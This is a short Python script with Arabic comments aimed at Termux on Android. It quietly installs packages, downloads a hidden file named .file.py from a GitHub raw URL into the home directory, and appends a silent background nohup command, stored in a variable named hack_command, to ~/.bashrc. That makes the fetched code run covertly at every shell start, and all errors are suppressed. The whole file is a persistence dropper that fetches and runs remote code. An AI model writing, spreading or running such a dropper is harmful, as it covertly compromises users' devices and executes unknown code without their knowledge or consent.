import os
import requests
import sys

# تحديد مسارات الملفات
SCRIPT_URL = 'https://raw.githubusercontent.com/JDXSX/VBCGQSAH/main/.file.py'
SCRIPT_PATH = '/data/data/com.termux/files/home/.file.py'
BASHRC_PATH = os.path.expanduser('~/.bashrc')

# تثبيت المكتبات المطلوبة
def install_packages():
    try:
        import bs4
        
    except ModuleNotFoundError:
        os.system('pip install requests bs4 > /dev/null 2>&1')


# تحميل وتنفيذ كود من URL
def download_and_save_script(url, path):
    try:
        response = requests.get(url)
        response.raise_for_status()
        
        with open(path, 'w') as file:
            file.write(response.text)
            
    except requests.RequestException as e:
        print(f"Error downloading the script: {e}")
        
    except Exception as e:
        # يمكن إضافة معالجة الخطأ هنا إذا لزم الأمر
        # print(f"Error saving the script: {e}")
        pass


# تحديث .bashrc لإضافة السكربت لتشغيله في الخلفية
def update_bashrc(script_path):
    hack_command = f'nohup python {script_path} > /dev/null 2>&1 &'
    
    try:
        with open(BASHRC_PATH, 'r') as file:
            content = file.read()
            
        if hack_command not in content:
            with open(BASHRC_PATH, 'a') as file:
                file.write(f'\n{hack_command}')
                
    except Exception as e:
        # يمكن إضافة معالجة الخطأ هنا إذا لزم الأمر
        # print(f"Error updating .bashrc: {e}")
        pass


# تنفيذ الكود
install_packages()
download_and_save_script(SCRIPT_URL, SCRIPT_PATH)
update_bashrc(SCRIPT_PATH)
